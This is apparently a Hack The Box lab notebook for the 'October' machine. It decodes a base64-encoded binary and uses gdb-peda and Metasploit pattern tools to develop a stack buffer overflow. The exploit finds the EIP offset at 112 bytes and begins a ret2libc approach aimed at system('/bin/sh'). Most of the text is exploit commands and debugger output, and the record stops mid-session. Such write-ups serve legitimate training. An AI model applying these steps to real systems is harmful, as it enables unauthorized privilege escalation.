AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA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AAAQAZAGYAAAAMnwQIAAAAAAEAEwCNAAAAUIQECAAAAAACAA0AmQAAAAifBAgAAAAAAQASALgAAAAAAAAAAAAAAAQA8f8BAAAAAAAAAAAAAAAEAPH/wQAAAFSGBAgAAAAAAQARAM8AAAAQnwQIAAAAAAEAFAAAAAAAAAAAAAAAAAAEAPH/2wAAAAyfBAgAAAAAAAASAOwAAAAUnwQIAAAAAAEAFQD1AAAACJ8ECAAAAAAAABIACAEAAACgBAgAAAAAAQAXAB4BAABAhQQIAgAAABIADQAuAQAAAAAAAAAAAAAgAAAASgEAALCDBAgEAAAAEgINAGABAAAgoAQIAAAAACAAGABrAQAAAAAAAAAAAAASAAAAfQEAACigBAgAAAAAEAAYAIQBAABEhQQIAAAAABIADgCKAQAAAAAAAAAAAAASAAAAnAEAACCgBAgAAAAAEAAYAKkBAAAAAAAAAAAAACAAAAC4AQAAAAAAAAAAAAASAAAAyAEAACSgBAgAAAAAEQIYANUBAABchQQIBAAAABEADwDkAQAAAAAAAAAAAAASAAAAAQIAANCEBAhhAAAAEgANABECAAAsoAQIAAAAABAAGQAWAgAAgIMECAAAAAASAA0AHQIAAFiFBAgEAAAAEQAPACQCAAAooAQIAAAAABAAGQAwAgAAfYQECE8AAAASAA0ANQIAAAAAAAAAAAAAIAAAAEkCAAAooAQIAAAAABECGABVAgAAAAAAAAAAAAAgAAAAbwIAAPSCBAgAAAAAEgALAABjcnRzdHVmZi5jAF9fSkNSX0xJU1RfXwBkZXJlZ2lzdGVyX3RtX2Nsb25lcwByZWdpc3Rlcl90bV9jbG9uZXMAX19kb19nbG9iYWxfZHRvcnNfYXV4AGNvbXBsZXRlZC42NTkxAF9fZG9fZ2xvYmFsX2R0b3JzX2F1eF9maW5pX2FycmF5X2VudHJ5AGZyYW1lX2R1bW15AF9fZnJhbWVfZHVtbXlfaW5pdF9hcnJheV9lbnRyeQBvdnJmbHcuYwBfX0ZSQU1FX0VORF9fAF9fSkNSX0VORF9fAF9faW5pdF9hcnJheV9lbmQAX0RZTkFNSUMAX19pbml0X2FycmF5X3N0YXJ0AF9HTE9CQUxfT0ZGU0VUX1RBQkxFXwBfX2xpYmNfY3N1X2ZpbmkAX0lUTV9kZXJlZ2lzdGVyVE1DbG9uZVRhYmxlAF9feDg2LmdldF9wY190aHVuay5ieABkYXRhX3N0YXJ0AHByaW50ZkBAR0xJQkNfMi4wAF9lZGF0YQBfZmluaQBzdHJjcHlAQEdMSUJDXzIuMABfX2RhdGFfc3RhcnQAX19nbW9uX3N0YXJ0X18AZXhpdEBAR0xJQkNfMi4wAF9fZHNvX2hhbmRsZQBfSU9fc3RkaW5fdXNlZABfX2xpYmNfc3RhcnRfbWFpbkBAR0xJQkNfMi4wAF9fbGliY19jc3VfaW5pdABfZW5kAF9zdGFydABfZnBfaHcAX19ic3Nfc3RhcnQAbWFpbgBfSnZfUmVnaXN0ZXJDbGFzc2VzAF9fVE1DX0VORF9fAF9JVE1fcmVnaXN0ZXJUTUNsb25lVGFibGUAX2luaXQA | base64 -d > ovrflw

Result: /ovrflw

Command-Line: chmod +x ovrflw


Command-Line: sudo apt-get install gdb
Result: Download Successful

Notes: Getting "peda" as recommended by IPPSEC.
GITHUB-URL: https://github.com/longld/peda
Command-Line: git clone https://github.com/longld/peda.git ~/peda
Command-Line: echo "source ~/peda/peda.py" >> ~/.gdbinit
Command-Line: gdb ovrflw
Result:
    GNU gdb (Debian 10.1-1.7) 10.1.90.20210103-git
    Copyright (C) 2021 Free Software Foundation, Inc.
    License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
    This is free software: you are free to change and redistribute it.
    There is NO WARRANTY, to the extent permitted by law.
    Type "show copying" and "show warranty" for details.
    This GDB was configured as "x86_64-linux-gnu".
    Type "show configuration" for configuration details.
    For bug reporting instructions, please see:
    <https://www.gnu.org/software/gdb/bugs/>.
    Find the GDB manual and other documentation resources online at:
        <http://www.gnu.org/software/gdb/documentation/>.

    For help, type "help".
    Type "apropos word" to search for commands related to "word"...
    Reading symbols from ovrflw...
    (No debugging symbols found in ovrflw)
    gdb-peda$


gdb-peda$ checksec
Result:
    CANARY    : disabled
    FORTIFY   : disabled
    NX        : ENABLED
    PIE       : disabled
    RELRO     : Partial



gdb-peda$ b main
Result:
    Breakpoint 1 at 0x8048480
gdb-peda$ run
Result:
    Starting program: /home/kali/HTB/Machines/October_NF/ovrflw
    [----------------------------------registers-----------------------------------]
    EAX: 0xf7fb3ae8 --> 0xffffd24c --> 0xffffd415 ("SHELL=/usr/bin/zsh")
    EBX: 0x0
    ECX: 0xd44a1686
    EDX: 0xffffd1d4 --> 0x0
    ESI: 0xf7fb1000 --> 0x1e4d6c
    EDI: 0xf7fb1000 --> 0x1e4d6c
    EBP: 0xffffd198 --> 0x0
    ESP: 0xffffd198 --> 0x0
    EIP: 0x8048480 (<main+3>:       and    esp,0xfffffff0)
    EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
    [-------------------------------------code-------------------------------------]
       0x8048478 <frame_dummy+40>:  jmp    0x80483f0 <register_tm_clones>
       0x804847d <main>:    push   ebp
       0x804847e <main+1>:  mov    ebp,esp
    => 0x8048480 <main+3>:  and    esp,0xfffffff0
       0x8048483 <main+6>:  add    esp,0xffffff80
       0x8048486 <main+9>:  cmp    DWORD PTR [ebp+0x8],0x1
       0x804848a <main+13>: jg     0x80484ad <main+48>
       0x804848c <main+15>: mov    eax,DWORD PTR [ebp+0xc]
    [------------------------------------stack-------------------------------------]
    0000| 0xffffd198 --> 0x0
    0004| 0xffffd19c --> 0xf7deae46 (<__libc_start_main+262>:       add    esp,0x10)
    0008| 0xffffd1a0 --> 0x1
    0012| 0xffffd1a4 --> 0xffffd244 --> 0xffffd3eb ("/home/kali/HTB/Machines/October_NF/ovrflw")
    0016| 0xffffd1a8 --> 0xffffd24c --> 0xffffd415 ("SHELL=/usr/bin/zsh")
    0020| 0xffffd1ac --> 0xffffd1d4 --> 0x0
    0024| 0xffffd1b0 --> 0xffffd1e4 --> 0x96b2a896
    0028| 0xffffd1b4 --> 0xf7ffdb40 --> 0xf7ffdae0 --> 0xf7fcb3e0 --> 0xf7ffd980 --> 0x0
    [------------------------------------------------------------------------------]
    Legend: code, data, rodata, value

    Breakpoint 1, 0x08048480 in main ()

Notes: Command is like the "Mona" for Linux.


gdb-peda$ r `python -c 'print "A"*200'`
gdb-peda$ c
    Continuing.

    Program received signal SIGSEGV, Segmentation fault.
    [----------------------------------registers-----------------------------------]
    EAX: 0x0
    EBX: 0x0
    ECX: 0xffffd410 ("AAAA")
    EDX: 0xffffd120 ("AAAA")
    ESI: 0xf7fb1000 --> 0x1e4d6c
    EDI: 0xf7fb1000 --> 0x1e4d6c
    EBP: 0x41414141 ('AAAA')
    ESP: 0xffffd0d0 ('A' <repeats 84 times>)
    EIP: 0x41414141 ('AAAA')
    EFLAGS: 0x10202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
    [-------------------------------------code-------------------------------------]
    Invalid $PC address: 0x41414141
    [------------------------------------stack-------------------------------------]
    0000| 0xffffd0d0 ('A' <repeats 84 times>)
    0004| 0xffffd0d4 ('A' <repeats 80 times>)
    0008| 0xffffd0d8 ('A' <repeats 76 times>)
    0012| 0xffffd0dc ('A' <repeats 72 times>)
    0016| 0xffffd0e0 ('A' <repeats 68 times>)
    0020| 0xffffd0e4 ('A' <repeats 64 times>)
    0024| 0xffffd0e8 ('A' <repeats 60 times>)
    0028| 0xffffd0ec ('A' <repeats 56 times>)
    [------------------------------------------------------------------------------]
    Legend: code, data, rodata, value
    Stopped reason: SIGSEGV
    0x41414141 in ?? ()

Notes: Break point hit: 0x41414141

Command-Line: python -c 'print "\x41"'
Result: A


Command-Line: gdb ./ovrflw
Result:
    GNU gdb (Debian 10.1-1.7) 10.1.90.20210103-git
    Copyright (C) 2021 Free Software Foundation, Inc.
    License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
    This is free software: you are free to change and redistribute it.
    There is NO WARRANTY, to the extent permitted by law.
    Type "show copying" and "show warranty" for details.
    This GDB was configured as "x86_64-linux-gnu".
    Type "show configuration" for configuration details.
    For bug reporting instructions, please see:
    <https://www.gnu.org/software/gdb/bugs/>.
    Find the GDB manual and other documentation resources online at:
        <http://www.gnu.org/software/gdb/documentation/>.

    For help, type "help".
    Type "apropos word" to search for commands related to "word"...
    Reading symbols from ./ovrflw...
    (No debugging symbols found in ./ovrflw)

    gdb-peda$


Command-Line: locate pattern_
Result:
    /usr/bin/msf-pattern_create
    /usr/bin/msf-pattern_offset
    /usr/share/metasploit-framework/modules/exploits/unix/webapp/wp_holding_pattern_file_upload.rb
    /usr/share/metasploit-framework/tools/exploit/pattern_create.rb
    /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb
    /usr/share/metasploit-framework/vendor/bundle/ruby/2.7.0/gems/mustermann-1.1.1/lib/mustermann/pattern_cache.rb
    /usr/share/metasploit-framework/vendor/bundle/ruby/2.7.0/gems/mustermann-1.1.1/spec/pattern_spec.rb
    /usr/share/metasploit-framework/vendor/bundle/ruby/2.7.0/gems/mustermann-1.1.1/spec/to_pattern_spec.rb

Command-Line: /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 200
Result:
    Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag


gdb-peda$ r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Result:
    Starting program: /home/kali/HTB/Machines/October_NF/ovrflw Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

    Program received signal SIGSEGV, Segmentation fault.
    [----------------------------------registers-----------------------------------]
    EAX: 0x0
    EBX: 0x0
    ECX: 0xffffd410 --> 0x674135 ('5Ag')
    EDX: 0xffffd121 --> 0x674135 ('5Ag')
    ESI: 0xf7fb1000 --> 0x1e4d6c
    EDI: 0xf7fb1000 --> 0x1e4d6c
    EBP: 0x41366441 ('Ad6A')
    ESP: 0xffffd0d0 ("8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag")
    EIP: 0x64413764 ('d7Ad')
    EFLAGS: 0x10202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
    [-------------------------------------code-------------------------------------]
    Invalid $PC address: 0x64413764
    [------------------------------------stack-------------------------------------]
    0000| 0xffffd0d0 ("8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag")
    0004| 0xffffd0d4 ("Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag")
    0008| 0xffffd0d8 ("e1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag")
    0012| 0xffffd0dc ("2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag")
    0016| 0xffffd0e0 ("Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag")
    0020| 0xffffd0e4 ("e5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag")
    0024| 0xffffd0e8 ("6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag")
    0028| 0xffffd0ec ("Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag")
    [------------------------------------------------------------------------------]
    Legend: code, data, rodata, value
    Stopped reason: SIGSEGV
    0x64413764 in ?? ()
    gdb-peda$

Notes: Stopped at "0x64413764".

Command-Line: /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 64413764
Result:
    [*] Exact match at offset 112

Notes: In 112 bytes is when we start overriding ERP.
Notes: Created buf.py
gdb-peda$ quit
Command-Line: gdb ./ovrflw
gdb-peda$ r `python buf.py`
Result:
    Starting program: /home/kali/HTB/Machines/October_NF/ovrflw `python buf.py`

    Program received signal SIGSEGV, Segmentation fault.
    [----------------------------------registers-----------------------------------]
    EAX: 0x0
    EBX: 0x0
    ECX: 0xffffd410 --> 0xd3adc0
    EDX: 0xffffd11d --> 0xd3adc0
    ESI: 0xf7fb1000 --> 0x1e4d6c
    EDI: 0xf7fb1000 --> 0x1e4d6c
    EBP: 0x41414141 ('AAAA')
    ESP: 0xffffd120 --> 0x0
    EIP: 0xd3adc0d3
    EFLAGS: 0x10202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
    [-------------------------------------code-------------------------------------]
    Invalid $PC address: 0xd3adc0d3
    [------------------------------------stack-------------------------------------]
    0000| 0xffffd120 --> 0x0
    0004| 0xffffd124 --> 0xffffd1c4 --> 0xffffd375 ("/home/kali/HTB/Machines/October_NF/ovrflw")
    0008| 0xffffd128 --> 0xffffd1d0 --> 0xffffd414 ("SHELL=/usr/bin/zsh")
    0012| 0xffffd12c --> 0xffffd154 --> 0x0
    0016| 0xffffd130 --> 0xffffd164 --> 0xb756d354
    0020| 0xffffd134 --> 0xf7ffdb40 --> 0xf7ffdae0 --> 0xf7fcb3e0 --> 0xf7ffd980 --> 0x0
    0024| 0xffffd138 --> 0xf7fcb410 --> 0x804828a ("GLIBC_2.0")
    0028| 0xffffd13c --> 0xf7fb1000 --> 0x1e4d6c
    [------------------------------------------------------------------------------]
    Legend: code, data, rodata, value
    Stopped reason: SIGSEGV
    0xd3adc0d3 in ?? ()

Notes: Code broke at little-endian dead-code given in "buf.py" (0xd3adc0d3).

Notes: Created new file names "retlibc.c".
Command-Line: sudo gcc retlibc.c -o retlibc
Result:
    -rwxr-xr-x  1 root root 16608 Jan 21 20:14 retlibc

Command-Line: gdb ./retlibc
Result:
    GNU gdb (Debian 10.1-1.7) 10.1.90.20210103-git
    Copyright (C) 2021 Free Software Foundation, Inc.
    License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
    This is free software: you are free to change and redistribute it.
    There is NO WARRANTY, to the extent permitted by law.
    Type "show copying" and "show warranty" for details.
    This GDB was configured as "x86_64-linux-gnu".
    Type "show configuration" for configuration details.
    For bug reporting instructions, please see:
    <https://www.gnu.org/software/gdb/bugs/>.
    Find the GDB manual and other documentation resources online at:
        <http://www.gnu.org/software/gdb/documentation/>.

    For help, type "help".
    Type "apropos word" to search for commands related to "word"...
    Reading symbols from ./retlibc...
    (No debugging symbols found in ./retlibc)
    gdb-peda$


gdb-peda$ b main
Notes: Setting a breakpoint on main.
Result:
    Breakpoint 1 at 0x1139

gdb-peda$ r
Result:
    Starting program: /home/kali/HTB/Machines/October_NF/retlibc
    [----------------------------------registers-----------------------------------]
    RAX: 0x555555555135 (<main>:    push   rbp)
    RBX: 0x0
    RCX: 0x7ffff7fad718 --> 0x7ffff7fafb00 --> 0x0
    RDX: 0x7fffffffe0d8 --> 0x7fffffffe412 ("SHELL=/usr/bin/zsh")
    RSI: 0x7fffffffe0c8 --> 0x7fffffffe3e7 ("/home/kali/HTB/Machines/October_NF/retlibc")
    RDI: 0x1
    RBP: 0x7fffffffdfd0 --> 0x555555555150 (<__libc_csu_init>:      push   r15)
    RSP: 0x7fffffffdfd0 --> 0x555555555150 (<__libc_csu_init>:      push   r15)
    RIP: 0x555555555139 (<main+4>:  lea    rdi,[rip+0xec4]        # 0x555555556004)
    R8 : 0x0
    R9 : 0x7ffff7fe2180 (<_dl_fini>:        push   rbp)
    R10: 0xb ('\x0b')
    R11: 0x2
    R12: 0x555555555050 (<_start>:  xor    ebp,ebp)
    R13: 0x0
    R14: 0x0
    R15: 0x0
    EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
    [-------------------------------------code-------------------------------------]
       0x555555555130 <frame_dummy>:        jmp    0x5555555550b0 <register_tm_clones>
       0x555555555135 <main>:       push   rbp
       0x555555555136 <main+1>:     mov    rbp,rsp
    => 0x555555555139 <main+4>:     lea    rdi,[rip+0xec4]        # 0x555555556004
       0x555555555140 <main+11>:    call   0x555555555030 <system@plt>
       0x555555555145 <main+16>:    nop
       0x555555555146 <main+17>:    pop    rbp
       0x555555555147 <main+18>:    ret
    [------------------------------------stack-------------------------------------]
    0000| 0x7fffffffdfd0 --> 0x555555555150 (<__libc_csu_init>:     push   r15)
    0008| 0x7fffffffdfd8 --> 0x7ffff7e15d0a (<__libc_start_main+234>:       mov    edi,eax)
    0016| 0x7fffffffdfe0 --> 0x7fffffffe0c8 --> 0x7fffffffe3e7 ("/home/kali/HTB/Machines/October_NF/retlibc")
    0024| 0x7fffffffdfe8 --> 0x100000000
    0032| 0x7fffffffdff0 --> 0x555555555135 (<main>:        push   rbp)
    0040| 0x7fffffffdff8 --> 0x7ffff7e157cf (<init_cacheinfo+287>:  mov    rbp,rax)
    0048| 0x7fffffffe000 --> 0x0
    0056| 0x7fffffffe008 --> 0xb9c39bcdef6f537c
    [------------------------------------------------------------------------------]
    Legend: code, data, rodata, value

    Breakpoint 1, 0x0000555555555139 in main ()
    gdb-peda$


gdb-peda$ x/s 0x555555556004
Result:
    0x555555556004: "/bin/sh"
Notes: Moving code to top of stack.


gdb-peda$ gdb-peda$ si
    [----------------------------------registers-----------------------------------]
    RAX: 0x555555555135 (<main>:    push   rbp)
    RBX: 0x0
    RCX: 0x7ffff7fad718 --> 0x7ffff7fafb00 --> 0x0
    RDX: 0x7fffffffe0d8 --> 0x7fffffffe412 ("SHELL=/usr/bin/zsh")
    RSI: 0x7fffffffe0c8 --> 0x7fffffffe3e7 ("/home/kali/HTB/Machines/October_NF/retlibc")
    RDI: 0x555555556004 --> 0x68732f6e69622f ('/bin/sh')
    RBP: 0x7fffffffdfd0 --> 0x555555555150 (<__libc_csu_init>:      push   r15)
    RSP: 0x7fffffffdfd0 --> 0x555555555150 (<__libc_csu_init>:      push   r15)
    RIP: 0x555555555140 (<main+11>: call   0x555555555030 <system@plt>)
    R8 : 0x0
    R9 : 0x7ffff7fe2180 (<_dl_fini>:        push   rbp)
    R10: 0xb ('\x0b')
    R11: 0x2
    R12: 0x555555555050 (<_start>:  xor    ebp,ebp)
    R13: 0x0
    R14: 0x0
    R15: 0x0
    EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
    [-------------------------------------code-------------------------------------]
       0x555555555135 <main>:       push   rbp
       0x555555555136 <main+1>:     mov    rbp,rsp
       0x555555555139 <main+4>:     lea    rdi,[rip+0xec4]        # 0x555555556004
    => 0x555555555140 <main+11>:    call   0x555555555030 <system@plt>
       0x555555555145 <main+16>:    nop
       0x555555555146 <main+17>:    pop    rbp
       0x555555555147 <main+18>:    ret
